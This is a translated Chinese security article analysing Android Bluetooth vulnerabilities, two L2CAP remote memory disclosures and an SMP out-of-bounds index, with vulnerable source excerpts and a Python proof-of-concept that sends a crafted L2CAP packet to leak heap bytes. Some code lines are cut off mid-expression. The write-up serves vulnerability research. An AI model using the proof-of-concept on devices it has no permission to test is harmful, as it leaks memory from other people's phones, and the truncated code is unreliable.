# 快速理解Android中的三个蓝牙漏洞
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
> 两个内存泄漏和一个数组索引越界
## 漏洞简介
  * [Issue 74882215](https://issuetracker.google.com/issues/74882215): Bluetooth L2CAP L2CAP_CMD_CONN_REQ Remote Memory Disclosure（蓝牙L2CAP L2CAP_CMD_CONN_REQ远程内存泄漏）
  * [Issue 74889513](https://issuetracker.google.com/issues/74889513): Bluetooth L2CAP L2CAP_CMD_DISC_REQ Remote Memory Disclosure（蓝牙L2CAP L2CAP_CMD_DISC_REQ远程内存泄漏）
  * [Issue 74917004](https://issuetracker.google.com/issues/74917004): Bluetooth SMP smp_sm_event() OOB Array Indexing（蓝牙SMP smp_sm_event（）OOB数组索引）
## 漏洞1：Bluetooth L2CAP L2CAP_CMD_CONN_REQ Remote Memory Disclosure
`（蓝牙L2CAP L2CAP_CMD_CONN_REQ远程内存泄漏）`
###  简要
通过将巧尽心思构造的`L2CAP数据包`发送到目标设备，蓝牙范围内的远程攻击者可以利用Android蓝牙堆栈中的漏洞来泄露属于`com.android.bluetooth`守护程序堆的
**2个** 字节（一个uint16_t数据）。
###  前置介绍
####  L2CAP
L2CAP（Logical Link Control and Adaptation Protocol），即逻辑链路控制和适配协议
【蓝牙架构中如图所示】
`L2CAP`是蓝牙协议栈中的一个协议。
功能包括 为更高层的协议传输数据、在单个链路上复用多个应用程序。
`L2CAP`是基于信道的，并且控制命令在预定义的`L2CAP_SIGNALLING_CID（0x01）`信道上发送。
###  漏洞详情
> 漏洞在于使用 `STREAM_TO_UINT16`宏而不检查攻击者控制的数据包中是否剩余了足够的数据。如果第二次使用
> `STREAM_TO_UINT16`时，数据包中没有剩余字节，那么将越界读取 `rcid`
>
> 结果：泄漏数据包后相邻的两个字节（rcid）
`L2CAP`传入的数据由`l2c_rcv_acl_data()`函数`[ platform / system / bt / stack / l2cap /
l2c_main.cc ]`处理。
如果传入的`L2CAP数据包`指定`L2CAP_SIGNALLING_CID`作为其目标通道，则`l2c_rcv_acl_data()`调用`process_l2cap_cmd()`函数来处理`L2CAP`控制命令。
以上过程如下所示：
`L2CAP_CMD_CONN_REQ`控制命令在`process_L2CAP_CMD()`函数中是这样处理的：
    case L2CAP_CMD_CONN_REQ:
      STREAM_TO_UINT16(con_info.psm, p);
      STREAM_TO_UINT16(rcid, p);
      p_rcb = l2cu_find_rcb_by_psm(con_info.psm);
      if (p_rcb == NULL) {
        L2CAP_TRACE_WARNING("L2CAP - rcvd conn req for unknown PSM: %d",
                            con_info.psm);
        l2cu_reject_connection(p_lcb, rcid, id, L2CAP_CONN_NO_PSM);
        break;
      } else {
      [...]
代码使用了两次`STREAM_TO_UINT16`宏`[ platform / system / bt / stack / include /
bt_types.h ]`，
从`L2CAP数据包`（上面的变量p，就是数据包中的数据）中一共读取2个`uint16_t`值（读入后分别放入了`con_info.psm`和`rcid`中）。
    #define STREAM_TO_UINT16(u16, p)                                  \
      {                                                               \
        (u16) = ((uint16_t)(*(p)) + (((uint16_t)(*((p) + 1)))  `。
例如：`$ sudo python l2cap01.py hci0 00：11：22：33：44：55`。
    import os
    import sys
    from l2cap_infra import *
    L2CAP_SIGNALLING_CID = 0x01
    L2CAP_CMD_CONN_REQ = 0x02
    def main(src_hci, dst_bdaddr):
        l2cap_loop, _ = create_l2cap_connection(src_hci, dst_bdaddr)
        # This will leak 2 bytes from the heap 这将从堆中泄漏2个字节
        print "Sending L2CAP_CMD_CONN_REQ in L2CAP connection..." #发送L2CAP连接中的L2CAP命令连接请求
        cmd_code = L2CAP_CMD_CONN_REQ
        cmd_id = 0x41               # not important
        cmd_len = 0x00              # bypasses this check at lines 296/297 of l2c_main.cc:   p_next_cmd = p + cmd_len; / if (p_next_cmd > p_pkt_end) {
        non_existent_psm = 0x3333   # Non-existent Protocol/Service Multiplexer id, so l2cu_find_rcb_by_psm() returns NULL and l2cu_reject_connection() is called 协议/服务多路复用器id不存在，因此l2cu_find_rcb_by_psm()返回NULL，并调用l2cu_reject_connection（）
        # here we use L2CAP_SIGNALLING_CID as cid, so l2c_rcv_acl_data() calls process_l2cap_cmd():
        #这里我们将L2CAP_signaling_CID用作CID，因此l2c_rcv_acl_data()调用进程_L2CAP_cmd()：
        # 170    /* Send the data through the channel state machine 通过通道状态机发送数据*/
        # 171    if (rcv_cid == L2CAP_SIGNALLING_CID) {
        # 172      process_l2cap_cmd(p_lcb, p, l2cap_len);
        l2cap_loop.send(L2CAP_Hdr(cid=L2CAP_SIGNALLING_CID) / Raw(struct.pack(' ")
        else:
            if os.getuid():
                print "Error: This script must be run as root."
            else:
                main(*sys.argv[1:])
## 漏洞2：Bluetooth L2CAP L2CAP_CMD_DISC_REQ Remote Memory Disclosure
`蓝牙L2CAP L2CAP_CMD_DISC_REQ远程内存泄露`
###  简要
通过将特制的`L2CAP数据包`发送到目标设备，蓝牙范围内的远程攻击者可以使用Android
蓝牙堆栈中的漏洞来泄露属于`com.android.bluetooth`守护程序堆的4个字节。
###  漏洞详情
> 漏洞在于，两次使用了`STREAM_TO_UINT16` 宏，而没有检查攻击者控制的数据包中是否至少还有4个字节。如果数据包中没有剩余字节，则越界读取
> `lcid` 和 `rcid`。
>
> 结果：泄漏数据包后相邻的四个字节
`L2CAP_CMD_DISC_REQ`控制命令在`process_L2CAP_CMD()`函数中是这样处理的：
    case L2CAP_CMD_DISC_REQ:
      STREAM_TO_UINT16(lcid, p);
      STREAM_TO_UINT16(rcid, p);
      p_ccb = l2cu_find_ccb_by_cid(p_lcb, lcid);
      if (p_ccb != NULL) {
        if (p_ccb->remote_cid == rcid) {
          p_ccb->remote_id = id;
          l2c_csm_execute(p_ccb, L2CEVT_L2CAP_DISCONNECT_REQ, &con_info);
        }
      } else
        l2cu_send_peer_disc_rsp(p_lcb, id, lcid, rcid);
上面的代码两次使用`STREAM_TO_UINT16`宏[ `platform / system / bt / stack / include /
bt_types.h` ] ，从`L2CAP数据包`中一共读取2个`uint16_t`值（`lcid`和`rcid`）：
漏洞在于，两次使用了`STREAM_TO_UINT16`宏，而没有检查攻击者控制的数据包中是否至少还有4个字节。如果数据包中没有剩余字节，则越界读取`lcid`和`rcid`，更准确地说，从堆上与数据包数据相邻的任何数据读取。之后，如果`l2cu_find_ccb_by_cid()`返回NULL并因此到达else分支，则调用`l2cu_send_peer_disc_rsp()
[ platform / system / bt / stack / l2cap / l2c_utils.cc
]`向远程对等方发送`lcid`和`rcid`，有效地从堆中泄漏了4个字节：
    void l2cu_send_peer_disc_rsp(tL2C_LCB* p_lcb, uint8_t remote_id,
                                 uint16_t local_cid, uint16_t remote_cid) {
    [...]
      UINT16_TO_STREAM(p, local_cid);
      UINT16_TO_STREAM(p, remote_cid);
      l2c_link_check_send_pkts(p_lcb, NULL, p_buf);
    }
请注意，攻击者可能会完全影响`l2cu_find_ccb_by_cid()`来返回NULL（并因此到达else分支），因为除非在目标蓝牙设备和攻击者的蓝牙设备之间使用虚假`lcid`设置了活动的信道控制块`（CCB）`，否则该函数将始终返回NULL。
图示如下：
从堆栈上通过函数`STREAM_TO_UINT16`分别读取两字节到`lcid`和`rcid`，`con_info.psm`再通过函数`l2cu_find_ccd_by_cid`函数得到`p_ccb`，对`p_ccb`进行判断，如果`p_ccb
== NULL`（通过在目标蓝牙之间使用的虚拟lcid不设置活动的信道控制块来实现），然后就会像远程对等方发送lcid和rcid等信息。
如果，数据包中的数据在`数据1..`之前就已经结束，程序还是会将堆栈上将相邻四个字节的数据（也就是`数据2..`）分别读入到`lcid`和`rcid`，最后发送给远程对等方。那么，最后整个攻击结果就是这里的内存泄漏了四个字节。
###  Proof-of-Concept（概念验证）
以下Python代码触发了该漏洞，并打印了从目标蓝牙设备的`com.android.bluetooth`守护程序堆泄漏的两个16位值。
此Python代码使用`Blueborne框架`中的`l2cap_infra包`。
用法： `$ sudo python l2cap02.py  `。